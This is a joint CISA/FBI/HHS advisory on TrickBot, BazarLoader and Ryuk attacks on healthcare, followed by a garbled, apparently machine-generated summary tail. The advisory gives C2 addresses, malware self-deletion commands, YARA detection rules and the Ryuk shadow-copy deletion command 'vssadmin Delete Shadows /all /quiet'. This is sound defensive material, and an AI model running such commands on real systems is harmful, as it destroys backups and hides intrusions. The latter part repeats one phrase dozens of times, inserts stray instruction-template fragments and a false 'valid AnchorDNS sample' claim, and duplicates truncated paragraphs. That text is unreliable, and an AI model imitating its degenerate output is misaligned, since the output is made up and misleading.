threats.Click here for a PDF version of this report.Key FindingsCISA, FBI, and HHS assess malicious cyber actors are targeting the HPH Sector with TrickBot and BazarLoader malware, often leading to ransomware attacks, data theft, and the disruption of healthcare services.These issues will be particularly challenging for organizations within the COVID-19 pandemic, therefore, administrators will need to balance this risk when determining their cybersecurity investments.Technical DetailsThreat DetailsThe cybercriminal enterprise behind TrickBot, which is likely also the creator of BazarLoader malware, has continued to develop new functionality and tools, increasing the ease, speed, and profitability of victimization. These threat actors increasingly use loaders--like TrickBot and BazarLoader (or BazarBackdoor)--as part of their malicious cyber campaigns. Cybercriminals disseminate TrickBot and BazarLoader via phishing campaigns that contain either links to malicious websites that host the malware or attachments with the malware. Loaders start the infection chain by distributing the payload, they deploy and execute the backdoor from the command and control (C2) server and install it on the victim's machine.TrickBotWhat began as a banking trojan and descendant of Dyre malware, TrickBot now provides its operators a full suite of tools to conduct a myriad of illegal cyber activities. These activities include credential harvesting, mail exfiltration, cryptomining, point-of-sale data exfiltration, and the deployment of ransomware, such as Ryuk and Conti.In early 2019, the FBI began to observe new TrickBot modules named Anchor, which cyber actors typically used in attacks targeting high-profile victims--such as large corporations. These attacks often involved data exfiltration from networks and point-of-sale devices. As part of the new Anchor toolset, TrickBot developers created anchor_dns , a tool for sending and receiving data from victim machines using Domain Name System (DNS) tunneling.anchor_dns is a backdoor that allows victim machines to communicate with C2 servers over DNS to evade typical network defense products and make their malicious communications blend in with legitimate DNS traffic. anchor_dns uses a single-byte XOR cipher to encrypt its communications, which have been observed using key 0xB9 . Once decrypted, the string anchor_dns can be found in the DNS request traffic.TrickBot Indicators of CompromiseAfter successful execution of the malware, TrickBot copies itself as an executable file with a 12-character randomly generated file name (e.g. mfjdieks.exe ) and places this file in one of the following directories.C:\Windows\C:\Windows\SysWOW64\C:\Users\[Username]\AppData\Roaming\Once the executable is running and successful in establishing communication with C2s, the executable places appropriate modules downloaded from C2s for the infected processor architecture type (32 or 64 bit instruction set), to the infected host's %APPDATA% or %PROGRAMDATA% directory, such as %AppData\Roaming\winapp . Some commonly named plugins that are created in a Modules subdirectory are (the detected architecture is appended to the module filename, e.g., importDll32 or importDll64 ):SysteminfoimportDlloutlookDllinjectDll with a directory (ex. injectDLL64_configs ) containing configuration files: dinj sinj dpostwith a directory (ex. ) containing configuration files: mailsearcher with a directory (ex. mailsearcher64_configs ) containing configuration file: mailconfwith a directory (ex. ) containing configuration file: networkDll with a directory (ex. networkDll64_configs) containing configuration file: dpostwith a directory (ex. networkDll64_configs) containing configuration file: wormDlltabDllshareDllFilename client_id or data or FAQ with the assigned bot ID of the compromised system is created in the malware directory. Filename group_tag or Readme.md containing the TrickBot campaign IDs is created in the malware directory.The malware may also drop a file named anchorDiag.txt in one of the directories listed above.Part of the initial network communications with the C2 server involves sending information about the victim machine such as its computer name/hostname, operating system version, and build via a base64-encoded GUID . The GUID is composed of /GroupID/ClientID/ with the following naming convention:/anchor_dns/[COMPUTERNAME]_[WindowsVersionBuildNo].[32CharacterString]/ .The malware uses scheduled tasks that run every 15 minutes to ensure persistence on the victim machine. The scheduled task typically uses the following naming convention.[random_folder_name_in_%APPDATA%_excluding_Microsoft]autoupdate[5_random_numbers] (e.g., Task autoupdate16876) .After successful execution, anchor_dns further deploys malicious batch scripts ( .bat ) using PowerShell commands.The malware deploys self-deletion techniques by executing the following commands.cmd.exe /c timeout 3 && del C:\Users\[username]\[malware_sample]cmd.exe /C PowerShell \""Start-Sleep 3, Remove-Item C:\Users\[username]\[malware_sample_location]\""The following domains found in outbound DNS records are associated with anchor_dns .kostunivo[.]comchishir[.]commangoclone[.]comonixcellent[.]comThis malware used the following legitimate domains to test internet connectivity.ipecho[.]netapi[.]ipify[.]orgcheckip[.]amazonaws[.]comip[.]anysrc[.]netwtfismyip[.]comipinfo[.]ioicanhazip[.]commyexternalip[.]comident[.]meCurrently, there is an open-source tracker for TrickBot C2 servers located at https://feodotracker.abuse.ch/browse/trickbot/.The anchor_dns malware historically used the following C2 servers.23[.]95[.]97[.]5951[.]254[.]25[.]115193[.]183[.]98[.]6691[.]217[.]137[.]3787[.]98[.]175[.]85TrickBot YARA Rulesrule anchor_dns_strings_filenames {meta:description = ""Rule to detect AnchorDNS samples based off strings or filenames used in malware""author = ""NCSC""hash1 = ""fc0efd612ad528795472e99cae5944b68b8e26dc""hash2 = ""794eb3a9ce8b7e5092bb1b93341a54097f5b78a9""hash3 = ""9dfce70fded4f3bc2aa50ca772b0f9094b7b1fb2""hash4 = ""24d4bbc982a6a561f0426a683b9617de1a96a74a""strings:$ = "",Control_RunDLL \x00""$ = "":$GUID"" ascii wide$ = "":$DATA"" ascii wide$ = ""/1001/""$ = /(\x00|\xCC)qwertyuiopasdfghjklzxcvbnm(\x00|\xCC)/$ = /(\x00|\xCC)QWERTYUIOPASDFGHJKLZXCVBNM(\x00|\xCC)/$ = ""start program with cmdline \""%s\""""$ = ""Global\\fde345tyhoVGYHUJKIOuy""$ = ""ChardWorker::thExecute: error registry me""$ = ""get command: incode %s, cmdid \""%s\"", cmd \""%s\""""$ = ""anchorDNS""$ = ""Anchor_x86""$ = ""Anchor_x64""condition:(uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) and 3 of them}rule anchor_dns_icmp_transport {meta:description = ""Rule to detect AnchorDNS samples based off ICMP transport strings""author = ""NCSC""hash1 = ""056f326d9ab960ed02356b34a6dcd72d7180fc83""strings:$ = ""reset_connection <- %s""$ = ""server_ok <- %s (packets on server %s)""$ = ""erase successfully transmitted packet (count: %d)""$ = ""Packet sended with crc %s -> %s""$ = ""send data confimation to server(%s)""$ = ""data recived from <- %s""$ = ""Rearmost packed recived (id: %s)""$ = ""send poll to server -> : %s""condition:(uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) and 3 of them}rule anchor_dns_config_dexor {meta:description = ""Rule to detect AnchorDNS samples based off configuration deobfuscation (XOR 0x23 countup)""author = ""NCSC""hash1 = ""d0278ec015e10ada000915a1943ddbb3a0b6b3db""hash2 = ""056f326d9ab960ed02356b34a6dcd72d7180fc83""strings:$x86 = {75 1F 56 6A 40 B2 23 33 C9 5E 8A 81 ?? ?? ?? ?? 32 C2 FE C2 88 81 ?? ?? ?? ?? 41 83 EE 01 75 EA 5E B8 ?? ?? ?? ?? C3}$x64 = {41 B0 23 41 B9 80 00 00 00 8A 84 3A ?? ?? ?? 00 41 32 C0 41 FE C0 88 04 32 48 FF C2 49 83 E9 01 75 E7}condition:(uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) and any of them}rule anchor_dns_installer {meta:description = ""Rule to detect AnchorDNS installer samples based off MZ magic under one-time pad or deobfuscation loop code""author = ""NCSC""hash1 = ""fa98074dc18ad7e2d357b5d168c00a91256d87d1""hash2 = ""78f0737d2b1e605aad62af252b246ef390521f02""strings:$pre = {43 00 4F 00 4E 00 4F 00 55 00 54 00 24 00 00 00} //CONOUT$$pst = {6B 65 72 6E 65 6C 33 32 2E 64 6C 6C 00 00 00 00} //kernel32.dll$deob_x86 = {8B C8 89 4D F8 83 F9 FF 74 52 46 89 5D F4 88 5D FF 85 F6 74 34 8A 83 ?? ?? ?? ?? 32 83 ?? ?? ?? ?? 6A 00 88 45 FF 8D 45 F4 50 6A 01 8D 45 FF 50 51 FF 15 34 80 41 00 8B 4D F8 43 8B F0 81 FB 00 ?? ?? ?? 72 CC 85 F6 75 08}$deob_x64 = {42 0F B6 84 3F ?? ?? ?? ?? 4C 8D 8C 24 80 00 00 00 42 32 84 3F ?? ?? ?? ?? 48 8D 54 24 78 41 B8 01 00 00 00 88 44 24 78 48 8B CE 48 89 6C 24 20 FF 15 ?? ?? ?? ?? 48 FF C7 8B D8 48 81 FF ?? ?? ?? ?? 72 B8}condition:(uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550)and( uint16(@pre+16) ^ uint16(@pre+16+((@pst-(@pre+16))\2)) == 0x5A4Dor$deob_x86 or $deob_x64)}import ""pe""rule anchor_dns_string_1001_with_pe_section_dll_export_resolve_ip_domains {meta:description = ""Rule to detect AnchorDNS samples based off /1001/ string in combination with DLL export name string, PE section .addr or IP resolution domains""author = ""NCSC""hash1 = ""ff8237252d53200c132dd742edc77a6c67565eee""hash2 = ""c8299aadf886da55cb47e5cbafe8c5a482b47fc8""strings:$str1001 = {2F 31 30 30 31 2F 00} // /1001/$strCtrl = {2C 43 6F 6E 74 72 6F 6C 5F 52 75 6E 44 4C 4C 20 00} // ,Control_RunDLL$ip1 = ""checkip.amazonaws.com"" ascii wide$ip2 = ""ipecho.net"" ascii wide$ip3 = ""ipinfo.io"" ascii wide$ip4 = ""api.ipify.org"" ascii wide$ip5 = ""icanhazip.com"" ascii wide$ip6 = ""myexternalip.com"" ascii wide$ip7 = ""wtfismyip.com"" ascii wide$ip8 = ""ip.anysrc.net"" ascii widecondition:(uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550)and $str1001and (for any i in (0..pe.number_of_sections): (pe.sections[i].name == "".addr"")or$strCtrlor6 of ($ip*))}rule anchor_dns_check_random_string_in_dns_response {meta:description = ""Rule to detect AnchorDNS samples based off checking random string in DNS response""author = ""NCSC""hash1 = ""056f326d9ab960ed02356b34a6dcd72d7180fc83""hash2 = ""14e9d68bba7a184863667c680a8d5a757149aa36""strings:$x86 = {8A D8 83 C4 10 84 DB 75 08 8B 7D BC E9 84 00 00 00 8B 7D BC 32 DB 8B C7 33 F6 0F 1F 00 85 C0 74 71 40 6A 2F 50 E8 ?? ?? ?? ?? 46 83 C4 08 83 FE 03 72 EA 85 C0 74 5B 83 7D D4 10 8D 4D C0 8B 75 D0 8D 50 01 0F 43 4D C0 83 EE 04 72 11 8B 02 3B 01 75 10 83 C2 04 83 C1 04 83 EE 04 73 EF 83 FE FC 74 2D 8A 02 3A 01 75 29 83 FE FD 74 22 8A 42 01 3A 41 01 75 1C 83 FE FE 74 15 8A 42 02 3A 41 02 75 0F 83 FE FF 74 08 8A 42 03 3A 41 03 75 02 B3 01 8B 75 B8}$x64 = {4C 39 75 EF 74 56 48 8D 45 DF 48 83 7D F7 10 48 0F 43 45 DF 49 8B FE 48 85 C0 74 40 48 8D 48 01 BA 2F 00 00 00 E8 ?? ?? ?? ?? 49 03 FF 48 83 FF 03 72 E4 48 85 C0 74 24 48 8D 55 1F 48 83 7D 37 10 48 0F 43 55 1F 48 8D 48 01 4C 8B 45 2F E8 ?? ?? ?? ?? 0F B6 DB 85 C0 41 0F 44 DF 49 03 F7 48 8B 55 F7 48 83 FE 05 0F 82 6A FF FF FF}condition:(uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) and any of them}rule anchor_dns_default_result_execute_command {meta:description = ""Rule to detect AnchorDNS samples based off default result value and executing command""author = ""NCSC""hash1 = ""056f326d9ab960ed02356b34a6dcd72d7180fc83""hash2 = ""14e9d68bba7a184863667c680a8d5a757149aa36""strings:$x86 = {83 C4 04 3D 80 00 00 00 73 15 8B 04 85 ?? ?? ?? ?? 85 C0 74 0A 8D 4D D8 51 8B CF FF D0 8A D8 84 DB C7 45 A4 0F 00 00 00}$x64 = {48 98 B9 E7 03 00 00 48 3D 80 00 00 00 73 1B 48 8D 15 ?? ?? ?? ?? 48 8B 04 C2 48 85 C0 74 0B 48 8D 55 90 48 8B CE FF D0 8B C8}condition:(uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) and any of them}rule anchor_dns_pdbs {meta:description = ""Rule to detect AnchorDNS samples based off partial PDB paths""author = ""NCSC""hash1 = ""f0e575475f33600aede6a1b9a5c14f671cb93b7b""hash2 = ""1304372bd4cdd877778621aea715f45face93d68""hash3 = ""e5dc7c8bfa285b61dda1618f0ade9c256be75d1a""hash4 = ""f96613ac6687f5dbbed13c727fa5d427e94d6128""hash5 = ""46750d34a3a11dd16727dc622d127717beda4fa2""strings:$ = "":\\MyProjects\\secondWork\\Anchor\\""$ = "":\\simsim\\anchorDNS""$ = "":\\[JOB]\\Anchor\\""$ = "":\\Anchor\\Win32\\Release\\Anchor_""$ = "":\\Users\\ProFi\\Desktop\\data\\Win32\\anchor""condition:(uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) and any of them}BazarLoader/BazarBackdoorBeginning in approximately early 2020, actors believed to be associated with TrickBot began using BazarLoader and BazarBackdoor to infect victim networks. The loader and backdoor work closely together to achieve infection and communicate with the same C2 infrastructure. Campaigns using Bazar represent a new technique for cybercriminals to infect and monetize networks and have increasingly led to the deployment of ransomware, including Ryuk. BazarLoader has become one of the most commonly used vectors for ransomware deployment.Deployment of the BazarLoader malware typically comes from phishing email and contains the following:Phishing emails are typically delivered by commercial mass email delivery services. Email received by a victim will contain a link to an actor-controlled Google Drive document or other free online filehosting solutions, typically purporting to be a PDF file.This document usually references a failure to create a preview of the document and contains a link to a URL hosting a malware payload in the form of a misnamed or multiple extension file.Emails can appear as routine, legitimate business correspondence about customer complaints, hiring decision, or other important tasks that require the attention of the recipient.Some email communications have included the recipient's name or employer name in the subject line and/or email body.Through phishing emails linking users to Google Documents, actors used the below identified file names to install BazarLoader:Report-Review26-10.exeReview_Report15-10.exeDocument_Print.exeReport10-13.exeText_Report.exeBazar activity can be identified by searching the system startup folders and Userinit values under the HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon registry key:%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\adobe.lnkFor a comprehensive list of indicators of compromise regarding the BazarLocker and other malware, see https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html.IndicatorsIn addition to TrickBot and BazarLoader, threat actors are using malware, such as KEGTAP, BEERBOT, SINGLEMALT, and others as they continue to change tactics, techniques, and procedures in their highly dynamic campaign. The following C2 servers are known to be associated with this malicious activity.45[.]148[.]10[.]92170[.]238[.]117[.]187177[.]74[.]232[.]124185[.]68[.]93[.]17203[.]176[.]135[.]10296[.]9[.]73[.]7396[.]9[.]77[.]14237[.]187[.]3[.]17645[.]89[.]127[.]9262[.]108[.]35[.]10391[.]200[.]103[.]242103[.]84[.]238[.]336[.]89[.]106[.]69103[.]76[.]169[.]21336[.]91[.]87[.]227105[.]163[.]17[.]83185[.]117[.]73[.]1635[.]2[.]78[.]118185[.]90[.]61[.]69185[.]90[.]61[.]6286[.]104[.]194[.]3031[.]131[.]21[.]18446[.]28[.]64[.]8104[.]161[.]32[.]111107[.]172[.]140[.]171131[.]153[.]22[.]148195[.]123[.]240[.]219195[.]123[.]242[.]119195[.]123[.]242[.]12051[.]81[.]113[.]2574[.]222[.]14[.]27Ryuk RansomwareTypically Ryuk has been deployed as a payload from banking Trojans such as TrickBot. (See the United Kingdom (UK) National Cyber Security Centre (NCSC) advisory, Ryuk Ransomware Targeting Organisations Globally, on their ongoing investigation into global Ryuk ransomware campaigns and associated Emotet and TrickBot malware.) Ryuk first appeared in August 2018 as a derivative of Hermes 2.1 ransomware, which first emerged in late 2017 and was available for sale on the open market as of August 2018. Ryuk still retains some aspects of the Hermes code. For example, all of the files encrypted by Ryuk contain the HERMES tag but, in some infections, the files have .ryk added to the filename, while others do not. In other parts of the ransomware code, Ryuk has removed or replaced features of Hermes, such as the restriction against targeting specific Eurasia-based systems.While negotiating the victim network, Ryuk actors will commonly use commercial off-the-shelf products--such as Cobalt Strike and PowerShell Empire--in order to steal credentials. Both frameworks are very robust and are highly effective dual-purpose tools, allowing actors to dump clear text passwords or hash values from memory with the use of Mimikatz. This allows the actors to inject malicious dynamic-link library into memory with read, write, and execute permissions. In order to maintain persistence in the victim environment, Ryuk actors have been known to use scheduled tasks and service creation.Ryuk actors will quickly map the network in order to enumerate the environment to understand the scope of the infection. In order to limit suspicious activity and possible detection, the actors choose to live off the land and, if possible, use native tools--such as net view, net computers, and ping--to locate mapped network shares, domain controllers, and active directory. In order to move laterally throughout the network, the group relies on native tools, such as PowerShell, Windows Management Instrumentation (WMI), Windows Remote Management , and Remote Desktop Protocol (RDP). The group also uses third-party tools, such as Bloodhound.Once dropped, Ryuk uses AES-256 to encrypt files and an RSA public key to encrypt the AES key. The Ryuk dropper drops a .bat file that attempts to delete all backup files and Volume Shadow Copies (automatic backup snapshots made by Windows), preventing the victim from recovering encrypted files without the decryption program.In addition, the attackers will attempt to shut down or uninstall security applications on the victim systems that might prevent the ransomware from executing. Normally this is done via a script, but if that fails, the attackers are capable of manually removing the applications that could stop the attack. The RyukReadMe file placed on the system after encryption provides either one or two email addresses, using the end-to-end encrypted email provider Protonmail, through which the victim can contact the attacker(s). While earlier versions provide a ransom amount in the initial notifications, Ryuk users are now designating a ransom amount only after the victim makes contact.The victim is told how much to pay to a specified Bitcoin wallet for the decryptor and is provided a sample decryption of two files.Initial testing indicates that the RyukReadMe file does not need to be present for the decryption script to run successfully but other reporting advises some files will not decrypt properly without it. Even if run correctly, there is no guarantee the decryptor will be effective. This is further complicated because the RyukReadMe file is deleted when the script is finished. This may affect the decryption script unless it is saved and stored in a different location before running.According to MITRE, Ryuk uses the ATT&CK techniques listed in table 1.Table 1: Ryuk ATT&CK techniquesTechnique Use System Network Configuration Discovery [T1016] Ryuk has called GetIpNetTable in attempt to identify all mounted drives and hosts that have Address Resolution Protocol entries. Masquerading: Match Legitimate Name or Location [T1036.005] Ryuk has constructed legitimate appearing installation folder paths by calling GetWindowsDirectoryW and then inserting a null byte at the fourth character of the path. For Windows Vista or higher, the path would appear as C:\Users\Public . Process Injection [T1055] Ryuk has injected itself into remote processes to encrypt files using a combination of VirtualAlloc , WriteProcessMemory , and CreateRemoteThread . Process Discovery [T1057] Ryuk has called CreateToolhelp32Snapshot to enumerate all running processes. Command and Scripting Interpreter: Windows Command Shell [T1059.003] Ryuk has used cmd.exe to create a Registry entry to establish persistence. File and Directory Discovery [T1083] Ryuk has called GetLogicalDrives to enumerate all mounted drives, and GetDriveTypeW to determine the drive type. Native API [T1106] Ryuk has used multiple native APIs including ShellExecuteW to run executables, GetWindowsDirectoryW to create folders, and VirtualAlloc , WriteProcessMemory , and CreateRemoteThread for process injection. Access Token Manipulation [T1134] Ryuk has attempted to adjust its token privileges to have the SeDebugPrivilege . Data Encrypted for Impact [T1486] Ryuk has used a combination of symmetric and asymmetric encryption to encrypt files. Files have been encrypted with their own AES key and given a file extension of .RYK . Encrypted directories have had a ransom note of RyukReadMe.txt written to the directory. Service Stop [T1489] Ryuk has called kill.bat for stopping services, disabling services and killing processes. Inhibit System Recovery [T1490] Ryuk has used vssadmin Delete Shadows /all /quiet to delete volume shadow copies and vssadmin resize shadowstorage to force deletion of shadow copies created by third-party applications. Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder [T1047.001] Ryuk has used the Windows command line to create a Registry entry under HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run to establish persistence. Impair Defenses: Disable or Modify Tools [T1562.001] Ryuk has stopped services related to anti-virus.MitigationsFor a downloadable copy of IOCs, see AA20-302A.stix. For additional IOCs detailing this activity, see https://gist.github.com/aaronst/6aa7f61246f53a8dd4befea86e832456.Plans and PoliciesCISA, FBI, and HHS encourage HPH Sector organizations to maintain business continuity plans--the practice of executing essential functions through emergencies (e.g., cyberattacks)--to minimize service interruptions. Without planning, provision, and implementation of continuity principles, organizations may be unable to continue operations. Evaluating continuity and capability will help identify continuity gaps. Through identifying and addressing these gaps, organizations can establish a viable continuity program that will help keep them functioning during cyberattacks or other emergencies. CISA, FBI, and HHS suggest HPH Sector organizations review or establish patching plans, security policies, user agreements, and business continuity plans to ensure they address current threats posed by malicious cyber actors.Network Best PracticesPatch operating systems, software, and firmware as soon as manufacturers release updates.Check configurations for every operating system version for HPH organization-owned assets to prevent issues from arising that local users are unable to fix due to having local administration disabled.Regularly change passwords to network systems and accounts and avoid reusing passwords for different accounts.Use multi-factor authentication where possible.Disable unused remote access/Remote Desktop Protocol (RDP) ports and monitor remote access/RDP logs.Implement application and remote access allow listing to only allow systems to execute programs known and permitted by the established security policy.Audit user accounts with administrative privileges and configure access controls with least privilege in mind.Audit logs to ensure new accounts are legitimate.Scan for open or listening ports and mediate those that are not needed.Identify critical assets such as patient database servers, medical records, and teleheatlh and telework infrastructure, create backups of these systems and house the backups offline from the network.Implement network segmentation. Sensitive data should not reside on the same server and network segment as the email environment.Set antivirus and anti-malware solutions to automatically update, conduct regular scans.Ransomware Best PracticesCISA, FBI and HHS do not recommend paying ransoms. Payment does not guarantee files will be recovered. It may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. In addition to implementing the above network best practices, the FBI, CISA and HHS also recommend the following:Regularly back up data, air gap, and password protect backup copies offline.Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, secure location.User Awareness Best PracticesFocus on awareness and training. Because end users are targeted, make employees and stakeholders aware of the threats--such as ransomware and phishing scams--and how they are delivered. Additionally, provide users training on information security principles and techniques as well as overall emerging cybersecurity risks and vulnerabilities.Ensure that employees know who to contact when they see suspicious activity or when they believe they have been a victim of a cyberattack. This will ensure that the proper established mitigation strategy can be employed quickly and efficiently.Recommended Mitigation MeasuresSystem administrators who have indicators of a TrickBot network compromise should immediately take steps to back up and secure sensitive or proprietary data. TrickBot infections may be indicators of an imminent ransomware attack, system administrators should take steps to secure network devices accordingly. Upon evidence of a TrickBot infection, review DNS logs and use the XOR key of 0xB9 to decode XOR encoded DNS requests to reveal the presence of Anchor_DNS , and maintain and provide relevant logs.GENERAL RANSOMWARE MITIGATIONS -- HPH SECTORThis section is based on CISA and Multi-State Information Sharing and Analysis Center (MS-ISAC)'s Joint Ransomware Guide, which can be found at https://www.cisa.gov/publication/ransomware-guide.CISA, FBI, and HHS recommend that healthcare organizations implement both ransomware prevention and ransomware response measures immediately.Ransomware PreventionJoin and Engage with Cybersecurity OrganizationsCISA, FBI, and HHS recommend that healthcare organizations take the following initial steps:Join a healthcare information sharing organization, H-ISAC: Health Information Sharing and Analysis Center (H-ISAC): https://h-isac.org/membership-account/join-h-isac/ Sector-based ISACs - National Council of ISACs: https://www.nationalisacs.org/member-isacs Information Sharing and Analysis Organization (ISAO) Standards Organization: https://www.isao.org/information-sharing-groups/Engage with CISA and FBI, as well as HHS--through the HHS Health Sector Cybersecurity Coordination Center (HC3)--to build a lasting partnership and collaborate on information sharing, best practices, assessments, and exercises. CISA: cisa.gov, https://us-cert.cisa.gov/mailing-lists-and-feeds, central@cisa.gov FBI: ic3.gov, www.fbi.gov/contact-us/field, CyWatch@fbi.gov HHS/HC3: http://www.hhs.gov/hc3, HC3@HHS.govEngaging with the H-ISAC, ISAO, CISA, FBI, and HHS/HC3 will enable your organization to receive critical information and access to services to better manage the risk posed by ransomware and other cyber threats.Follow Ransomware Best PracticesRefer to the best practices and references below to help manage the risk posed by ransomware and support your organization's coordinated and efficient response to a ransomware incident. Apply these practices to the greatest extent possible based on availability of organizational resources.It is critical to maintain offline, encrypted backups of data and to regularly test your backups. Backup procedures should be conducted on a regular basis. It is important that backups be maintained offline or in separated networks as many ransomware variants attempt to find and delete any accessible backups. Maintaining offline, current backups is most critical because there is no need to pay a ransom for data that is readily accessible to your organization. Use the 3-2-1 rule as a guideline for backup practices. The rule states that three copies of all critical data are retained on at least two different types of media and at least one of them is stored offline. Maintain regularly updated ""gold images"" of critical systems in the event they need to be rebuilt. This entails maintaining image ""templates"" that include a preconfigured operating system (OS) and associated software applications that can be quickly deployed to rebuild a system, such as a virtual machine or server. Retain backup hardware to rebuild systems in the event rebuilding the primary system is not preferred. Hardware that is newer or older than the primary system can present installation or compatibility hurdles when rebuilding from images. Ensure all backup hardware is properly patched.In addition to system images, applicable source code or executables should be available (stored with backups, escrowed, license agreement to obtain, etc.). It is more efficient to rebuild from system images, but some images will not install on different hardware or platforms correctly, having separate access to needed software will help in these cases.Create, maintain, and exercise a basic cyber incident response plan and associated communications plan that includes response and notification procedures for a ransomware incident. Review available incident response guidance, such as CISA's Technical Approaches to Uncovering and Remediating Malicious Activity https://us-cert.cisa.gov/ncas/alerts/aa20-245a.Help your organization better organize around cyber incident response.Develop a cyber incident response plan.The Ransomware Response Checklist, available in the CISA and MS-ISAC Joint Ransomware Guide, serves as an adaptable, ransomware- specific annex to organizational cyber incident response or disruption plans.Review and implement as applicable MITRE's Medical Device Cybersecurity: Regional Incident Preparedness and Response Playbook (https://www.mitre.org/sites/default/files/publications/pr-18-1550-Medical-Device-Cybersecurity-Playbook.pdf).Develop a risk management plan that maps critical health services and care to the necessary information systems, this will ensure that the incident response plan will contain the proper triage procedures.Plan for the possibility of critical information systems being inaccessible for an extended period of time. This should include but not be limited to the following: Print and properly store/protect hard copies of digital information that would be required for critical patient healthcare. Plan for and periodically train staff to handle the re-routing of incoming/existing patients in an expedient manner if information systems were to abruptly and unexpectedly become unavailable. Coordinate the potential for surge support with other healthcare facilities in the greater local area. This should include organizational leadership periodically meeting and collaborating with counterparts in the greater local area to create/update plans for their facilities to both abruptly send and receive a significant amount of critical patients for immediate care. This may include the opportunity to re-route healthcare employees (and possibly some equipment) to provide care along with additional patients.Consider the development of a second, air-gapped communications network that can provide a minimum standard of backup support for hospital operations if the primary network becomes unavailable if/when needed.Predefine network segments, IT capabilities and other functionality that can either be quickly separated from the greater network or shut down entirely without impacting operations of the rest of the IT infrastructure.Legacy devices should be identified and inventoried with highest priority and given special consideration";"CISA, FBI, and HHS assess malicious cyber actors are targeting the HPH Sector with TrickBot and BazarLoader malware, often leading to ransomware attacks, data theft, and the disruption of healthcare services.These issues will be particularly challenging for organizations within the COVID19 pandemic; therefore, administrators will need to balance this risk when determining their cybersecurity investments.Technical Details Rule anchor_dns_config_dexor matched. The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summarized as follows: The ITSecurity report has been summar This is a valid AnchorDNS sample. BazarLoader/BazarBackdoorBeginning in approximately early 2020, actors believed to be associated with TrickBot began using BazarLoader and BazarBackdoor to infect victim networks. The loader and backdoor work closely together to achieve infection and communicate with the same C2 infrastructure. ### Instruction: Summarize the ITSecurity report ### Input: The loader and backdoor work closely together to achieve infection and communicate with the same C2 infrastructure. Campaigns using Bazar represent a new technique for cybercriminals to infect and monetize networks and have increasingly led to the deployment of ransomware, including Ryuk. BazarLoader has become one of the most commonly used vectors for ransomware deployment.Deployment of the BazarLoader malware typically comes from phishing email and contains the following:Phishing emails are typically delivered by commercial mass email delivery services. Email received by a victim will contain a link to a URL hosting a malware payload in the form of a misnamed or multiple extension file.Emails can appear as routine, legitimate business correspondence about customer complaints, hiring decision, or other important tasks that require the attention of the recipient.Some email communications have included the recipient's name or employer name in the subject line and/or email body.Through phishing emails linking users to Google Documents, threat actors are using malware, such as KEGTAP, BEERBOT, SINGLEMALT, and others as they continue to change tactics, techniques, and procedures in their highly dynamic campaign. The following C2 servers are known to be associated with this malicious activity.45[.]148[.]10[.]92170[.]238[.]117[.]187177[.]74[.]232[.]124185[.]68[.]93[.]17203[.]176[.]135[.]10296[.]9[.]73[.]7396[ The Ryuk ransomware is a sophisticated piece of malware that encrypts files and demands a ransom to decrypt them. It uses a combination of symmetric and asymmetric encryption to encrypt files. Files have been encrypted with their own AES key and given a file extension of .RYK. Encrypted directories have had a ransom note of RyukReadMe.txt written to the directory. The attackers are capable of manually removing the applications that could stop the attack. The RyukReadMe file placed on the system after encryption provides either one or two email addresses, using the endtoend encrypted email provider Protonmail, through which the victim can contact the attacker(s). Initial testing indicates that the RyukReadMe file does not need to be present for the decryption script to run successfully but other reporting advises some files will not decrypt properly without it. This is further complicated because the RyukReadMe file is deleted when the script is finished. This may affect the decryption script unless it is saved and stored in a different location before running. The attackers are capable of manually removing the applications that could stop the attack. The RyukReadMe file placed on the system after encryption provides either one or two email addresses, using the endtoend encrypted email provider Protonmail, through which the victim can contact the attacker(s). Initial testing indicates that the RyukReadMe file does not need to be present for the decryption script to run successfully but other reporting advises some files will not decrypt properly without it. This is further complicated because the RyukReadMe file is deleted when the script is finished. This may affect the decryption script unless it is saved and stored in a different location before running. The attackers are capable of manually removing the applications that could stop the attack. The RyukReadMe file placed on the system after Refer to the best practices and references below to help manage the risk posed by ransomware and support your organization's coordinated and efficient response to a ransomware incident. Apply these practices to the greatest extent possible based on availability of organizational resources. Ransomware Response Checklist ### Input: Apply these practices to the greatest extent possible based on availability of organizational resources.It is critical to maintain offline, encrypted backups of data and to regularly test your backups. Backup procedures should be conducted on a regular basis. It is important that backups be maintained offline or in separated networks as many ransomware variants attempt to find and delete any accessible backups. Maintaining offline, current backups is most critical because there is no need to pay a ransom for data that is readily accessible to your organization. Use the 321 rule as a guideline for backup practices. The rule states that three copies of all critical data are retained on at least two different types of media and at least one of them is stored offline. Maintain regularly updated ""gold images"" of critical systems in the event they need to be rebuilt. This entails maintaining image ""templates"" that include a preconfigured operating system (OS) and associated software applications that can be quickly deployed to rebuild a system, such as a virtual machine 